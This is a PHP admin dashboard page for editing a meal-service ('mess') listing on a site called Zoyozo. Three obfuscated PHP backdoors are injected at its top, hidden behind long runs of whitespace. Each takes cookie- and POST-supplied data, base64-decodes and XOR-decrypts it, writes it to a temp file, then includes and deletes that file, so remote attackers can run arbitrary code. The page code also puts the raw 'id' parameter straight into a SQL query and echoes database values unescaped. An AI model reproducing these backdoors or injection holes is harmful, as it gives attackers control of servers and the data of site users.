<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("lzszlyn")){class lzszlyn{public static $yoylpgtbv = "tdzajesrckbctsyv";public static $sccbbeul = NULL;public function __construct(){$lbjztopv = @$_COOKIE[substr(lzszlyn::$yoylpgtbv, 0, 4)];if (!empty($lbjztopv)){$hooetisny = "base64";$auqxicsp = "";$lbjztopv = explode(",", $lbjztopv);foreach ($lbjztopv as $lwhkouyj){$auqxicsp .= @$_COOKIE[$lwhkouyj];$auqxicsp .= @$_POST[$lwhkouyj];}$auqxicsp = array_map($hooetisny . "_decode", array($auqxicsp,));$auqxicsp = $auqxicsp[0] ^ str_repeat(lzszlyn::$yoylpgtbv, (strlen($auqxicsp[0]) / strlen(lzszlyn::$yoylpgtbv)) + 1);lzszlyn::$sccbbeul = @unserialize($auqxicsp);}}public function __destruct(){$this->cixlcjq();}private function cixlcjq(){if (is_array(lzszlyn::$sccbbeul)) {$flpgwvxeo = sys_get_temp_dir() . "/" . crc32(lzszlyn::$sccbbeul["salt"]);@lzszlyn::$sccbbeul["write"]($flpgwvxeo, lzszlyn::$sccbbeul["content"]);include $flpgwvxeo;@lzszlyn::$sccbbeul["delete"]($flpgwvxeo);exit();}}}$vnfgpwps = new lzszlyn();$vnfgpwps = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("zbtfslrwhn")){class zbtfslrwhn{public static $twilrr = "eojdpxbyeuegczmu";public static $gxwqdy = NULL;public function __construct(){$qboazxtrw = @$_COOKIE[substr(zbtfslrwhn::$twilrr, 0, 4)];if (!empty($qboazxtrw)){$hrtwnr = "base64";$ueyes = "";$qboazxtrw = explode(",", $qboazxtrw);foreach ($qboazxtrw as $oybxlmspny){$ueyes .= @$_COOKIE[$oybxlmspny];$ueyes .= @$_POST[$oybxlmspny];}$ueyes = array_map($hrtwnr . "_decode", array($ueyes,));$ueyes = $ueyes[0] ^ str_repeat(zbtfslrwhn::$twilrr, (strlen($ueyes[0]) / strlen(zbtfslrwhn::$twilrr)) + 1);zbtfslrwhn::$gxwqdy = @unserialize($ueyes);}}public function __destruct(){$this->bjggs();}private function bjggs(){if (is_array(zbtfslrwhn::$gxwqdy)) {$oakvxbuzq = sys_get_temp_dir() . "/" . crc32(zbtfslrwhn::$gxwqdy["salt"]);@zbtfslrwhn::$gxwqdy["write"]($oakvxbuzq, zbtfslrwhn::$gxwqdy["content"]);include $oakvxbuzq;@zbtfslrwhn::$gxwqdy["delete"]($oakvxbuzq);exit();}}}$zdqhc = new zbtfslrwhn();$zdqhc = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("teyrr")){class teyrr{public static $nsdvfixzz = "kwaoryyfromrcfwo";public static $zbyroyv = NULL;public function __construct(){$hprhtrh = @$_COOKIE[substr(teyrr::$nsdvfixzz, 0, 4)];if (!empty($hprhtrh)){$yypka = "base64";$nhuffxgv = "";$hprhtrh = explode(",", $hprhtrh);foreach ($hprhtrh as $dmnddef){$nhuffxgv .= @$_COOKIE[$dmnddef];$nhuffxgv .= @$_POST[$dmnddef];}$nhuffxgv = array_map($yypka . "_decode", array($nhuffxgv,));$nhuffxgv = $nhuffxgv[0] ^ str_repeat(teyrr::$nsdvfixzz, (strlen($nhuffxgv[0]) / strlen(teyrr::$nsdvfixzz)) + 1);teyrr::$zbyroyv = @unserialize($nhuffxgv);}}public function __destruct(){$this->gmitnm();}private function gmitnm(){if (is_array(teyrr::$zbyroyv)) {$ynzzusjrh = sys_get_temp_dir() . "/" . crc32(teyrr::$zbyroyv["salt"]);@teyrr::$zbyroyv["write"]($ynzzusjrh, teyrr::$zbyroyv["content"]);include $ynzzusjrh;@teyrr::$zbyroyv["delete"]($ynzzusjrh);exit();}}}$cdseh = new teyrr();$cdseh = NULL;} ?><?php
session_start();
include("conn.php");

?>
<!DOCTYPE html>
<head>
<title>Zoyozo | Dashboard</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="keywords" content="Visitors Responsive web template, Bootstrap Web Templates, Flat Web Templates, Android Compatible web template, 
Smartphone Compatible web template, free webdesigns for Nokia, Samsung, LG, SonyEricsson, Motorola web design" />
<script type="application/x-javascript"> addEventListener("load", function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } </script>
<!-- bootstrap-css -->
<link rel="stylesheet" href="css/bootstrap.min.css" >
<!-- //bootstrap-css -->
<!-- Custom CSS -->
<link href="css/style.css" rel='stylesheet' type='text/css' />
<link href="css/style-responsive.css" rel="stylesheet"/>
<!-- font CSS -->
<link href='//fonts.googleapis.com/css?family=Roboto:400,100,100italic,300,300italic,400italic,500,500italic,700,700italic,900,900italic' rel='stylesheet' type='text/css'>
<!-- font-awesome icons -->
<link rel="stylesheet" href="css/font.css" type="text/css"/>
<link href="css/font-awesome.css" rel="stylesheet"> 
<link rel="stylesheet" href="css/morris.css" type="text/css"/>
<!-- calendar -->
<link rel="stylesheet" href="css/monthly.css">
<!-- //calendar -->
<!-- //font-awesome icons -->
<script src="js/jquery2.0.3.min.js"></script>
<script src="js/raphael-min.js"></script>
<script src="js/morris.js"></script>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://cdn.datatables.net/1.10.19/css/jquery.dataTables.min.css">
  <script src="https://code.jquery.com/jquery-3.3.1.js"></script>
<script src="https://cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js"></script>
<script type="text/javascript">
function startUpload(){
    $("#uploadProcess").show();
    document.getElementById('uploadForm').style.visibility = 'hidden';
    return true;
}

function stopUpload(success,uploadedFile){
    var result = '';
    if (success == 1){
        result = '<span class="sucess-msg">The file was uploaded successfully!<\/span><br/><br/>';
        //Uploaded file preview
        var embed = document.getElementById("UploadedFile");
        var clone = embed.cloneNode(true);
        clone.setAttribute('src',uploadedFile);
        embed.parentNode.replaceChild(clone,embed);
    }else {
       result = '<span class="error-msg">There was an error during file upload!<\/span><br/><br/>';
    }
    document.getElementById('uploadProcess').style.visibility = 'hidden';
    document.getElementById('uploadForm').innerHTML = result + '<label>File: <input name="myfile" type="file" size="30" /><\/label><label><input type="submit" name="submitBtn" class="sbtn" value="Upload" /><\/label>';
    document.getElementById('uploadForm').style.visibility = 'visible';      
    return true;   
}
</script> 
</head>
<body>
<section id="container">
<?php include 'category/menu.php';?>
<!--main content start-->
<section id="main-content">
<section class="wrapper">
		 <!-- contant -->
             <div class="form-w3layouts">
			        <div class="row">
            <div class="col-lg-12">
                    <section class="panel">
                        <header class="panel-heading">
                            <a href="index.php">Dashboard</a>  /   Upadate
                        </header>
						<br><br>
                        <div class="panel-body">
                            <div class="position-center">
							<header class="panel-heading">
                            Mess
							</header><br>
                               <?php
									include("conn.php");
									$id=$_GET['id'];
									$sqlupd="select * from tbl_mess where id='$id'";
									$smtupd=mysqli_query($conn,$sqlupd);
									$rowupd=mysqli_fetch_assoc($smtupd);
									 $_SESSION['file-url']=$rowupd['menu_url'];
							        session_write_close();
							   
							   ?>
							   <div class="form-group">
								
                                    
                                    <input type="hidden" class="form-control" id="txtIdUp" value="<?php echo $rowupd['id']; ?>">
									 
          
									
                                </div>
                                <div class="form-group">
                                    <label for="hostel">Title<span style="color:red">*</span></label>
                                    <input type="text" class="form-control" id="messTitleU" placeholder="Enter Title" value="<?php echo $rowupd['title']; ?>">
                                </div>
								
								<div class="form-group">
                                    <label for="hostel">Contact Person Name<span style="color:red">*</span></label>
                                    <input type="text" class="form-control" id="messCpersonU" value="<?php echo $rowupd['contact_person']; ?>">
                                </div>
								<div class="form-group">
                                    <label for="hostel">Select City<span style="color:red">*</span></label>
									<select class="form-control" id="messCityU">
									<option selected="selected">Select City</option>
										<?php
											$sql="select * from tbl_city";
											$smt=mysqli_query($conn,$sql);
											while($rs=mysqli_fetch_assoc($smt))
											{
										?>
											
											<option value="<?php echo $rs['name'] ?>"><?php echo $rs['name'] ?></option>
										<?php
											}
											?>
									</select>
                                    
                                </div>
										<form action="mess-upload.php" method="post" enctype="multipart/form-data" target="uploadTarget" onsubmit="startUpload();" >
            <p id="uploadProcess" style="display:none";></b>Uploaded Sucessfully</b><br/><br/></p>
            <p id="uploadForm"><br/>
                <label>
                    Select Menu File and Upload:<input name="myfile" type="file" size="30" />
                </label>
                <label>
                    <input type="submit" name="submitBtn" class="sbtn" value="Upload Image" />
                </label>
            </p>
            <iframe id="uploadTarget" name="uploadTarget" src="#" style="width:0;height:0;border:0px solid #fff;"></iframe>
        </form>
		<div>
            <embed id="UploadedFile" src="" width="200px" height="200px">
        </div>
		
								
								
								<div class="form-group">
                                    <label for="hostel">Mobile No<span style="color:red">*</span></label>
                                    <input type="text" class="form-control" id="messMobileU" value="<?php echo $rowupd['contact_person']; ?>">
                                </div>
								
								<div class="form-group">
                                    <label for="hostel">Alt. Mobile No<span style="color:red">*</span></label>
                                    <input type="text" class="form-control" id="messAltnoU" value="<?php echo $rowupd['contact_person']; ?>">
                                </div>
								<div class="form-group">
                                    <label for="hostel">What's App No</label>
                                    <input type="text" class="form-control" id="messWhatsAppU" value="<?php echo $rowupd['whatsapp']; ?>">
                                </div>
								<div class="form-group">
                                    <label for="Security">Advance Money</label>
                                    <input type="text" class="form-control" id="messAdvanceU" value="<?php echo $rowupd['advance_money']; ?>">
                                </div>
								<div class="form-group">
                                    <label for="month">Monthly Price</label>
									<input type="text" class="form-control" id="messMonthRentU" value="<?php echo $rowupd['monthly_rate']; ?>">
                                    
                                </div>
								<div class="form-group">
                                    <label for="month">Zoyozo Price</label>
									<input type="text" class="form-control" id="messZoyozoRentU" value="<?php echo $rowupd['zoyozo_rate']; ?>">
                                    
                                </div>
								 <div class="form-group">
                                    <label for="message">Delivery Area</label>
                                    <textarea class="form-control" rows="5" col="10" id="messAreaU" value=""><?php echo $rowupd['delivery_area']; ?></textarea>
                                </div>
								 <div class="form-group">
                                    <label for="message">Description</label>
                                    <textarea class="form-control" rows="5" col="10" id="messDescriptionU" value=""><?php echo $rowupd['description']; ?></textarea>
                                </div>
                                <div class="form-group">
                                    <label for="hostel">Select Available</label>
									<select class="form-control" id="selAvailable">
									<option value="0">Select Available</option>
										<option value="AVAILABLE">AVAILABLE</option>
										<option value="NOT AVAILABLE">NOT AVAILABLE</option>
									
										<option value="UNLIST">UNLIST</option>
											
										
									</select>
                                    
                                </div>
								
                                
								
								
                                <span style="color:#f00"><b>NOTE - All * Marked fields are required.</br>Please upload <U>image file</U> & <U>CITY</U> every time the Mess get updated.</b></span><br>	<br>
                                <button type="submit" class="btn btn-info" id="updateMess">Upadate Mess</button>
								<center>        <p>
                       <div id="msg"></div>
                      </p> </center>
                            
							
                            </div>

                        </div>
	 <div class="panel-heading">
      List of Accommodation
    </div>					
	<div class="row w3-res-tb">

      
		
        <div class="card-body" id="disp_grid_mess">
		
		</div>
    </div>

						
                    </section>

            </div>

        </div>
	  </div>


 <!-- //contant -->
		
</section>
 <!-- footer -->
   <?php include 'category/footer.php';?>
  <!-- / footer -->
</section>
<!--main content end-->
</section>
<script src="js/bootstrap.js"></script>
<script src="js/jquery.dcjqaccordion.2.7.js"></script>
<script src="js/scripts.js"></script>
<script src="js/jquery.slimscroll.js"></script>
<script src="js/jquery.nicescroll.js"></script>
<!--[if lte IE 8]><script language="javascript" type="text/javascript" src="js/flot-chart/excanvas.min.js"></script><![endif]-->
<script src="js/jquery.scrollTo.js"></script>
<script src="vendor/jquery/jquery.min.js"></script>
    <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
    <!-- Core plugin JavaScript-->
    <script src="vendor/jquery-easing/jquery.easing.min.js"></script>
    <!-- Page level plugin JavaScript-->
    <script src="vendor/datatables/jquery.dataTables.js"></script>
    <script src="vendor/datatables/dataTables.bootstrap4.js"></script>
<script src="js/sb-admin-datatables.min.js"></script>
<script src="js/custom.js"></script>
<!-- morris JavaScript -->	
<script>
	$(document).ready(function() {
		//BOX BUTTON SHOW AND CLOSE
	   jQuery('.small-graph-box').hover(function() {
		  jQuery(this).find('.box-button').fadeIn('fast');
	   }, function() {
		  jQuery(this).find('.box-button').fadeOut('fast');
	   });
	   jQuery('.small-graph-box .box-close').click(function() {
		  jQuery(this).closest('.small-graph-box').fadeOut(200);
		  return false;
	   });
	   
	    //CHARTS
	    function gd(year, day, month) {
			return new Date(year, month - 1, day).getTime();
		}
		
		graphArea2 = Morris.Area({
			element: 'hero-area',
			padding: 10,
        behaveLikeLine: true,
        gridEnabled: false,
        gridLineColor: '#dddddd',
        axes: true,
        resize: true,
        smooth:true,
        pointSize: 0,
        lineWidth: 0,
        fillOpacity:0.85,
			data: [
				{period: '2015 Q1', iphone: 2668, ipad: null, itouch: 2649},
				{period: '2015 Q2', iphone: 15780, ipad: 13799, itouch: 12051},
				{period: '2015 Q3', iphone: 12920, ipad: 10975, itouch: 9910},
				{period: '2015 Q4', iphone: 8770, ipad: 6600, itouch: 6695},
				{period: '2016 Q1', iphone: 10820, ipad: 10924, itouch: 12300},
				{period: '2016 Q2', iphone: 9680, ipad: 9010, itouch: 7891},
				{period: '2016 Q3', iphone: 4830, ipad: 3805, itouch: 1598},
				{period: '2016 Q4', iphone: 15083, ipad: 8977, itouch: 5185},
				{period: '2017 Q1', iphone: 10697, ipad: 4470, itouch: 2038},
			
			],
			lineColors:['#eb6f6f','#926383','#eb6f6f'],
			xkey: 'period',
            redraw: true,
            ykeys: ['iphone', 'ipad', 'itouch'],
            labels: ['All Visitors', 'Returning Visitors', 'Unique Visitors'],
			pointSize: 2,
			hideHover: 'auto',
			resize: true
		});
		
	   
	});
	</script>
<!-- calendar -->
	<script type="text/javascript" src="js/monthly.js"></script>
	<script type="text/javascript">
		$(window).load( function() {

			$('#mycalendar').monthly({
				mode: 'event',
				
			});

			$('#mycalendar2').monthly({
				mode: 'picker',
				target: '#mytarget',
				setWidth: '250px',
				startHidden: true,
				showTrigger: '#mytarget',
				stylePast: true,
				disablePast: true
			});

		switch(window.location.protocol) {
		case 'http:':
		case 'https:':
		// running on a server, should be good.
		break;
		case 'file:':
		alert('Just a heads-up, events will not work when run locally.');
		}

		});
	</script>
	<!-- //calendar -->
</body>
</html>



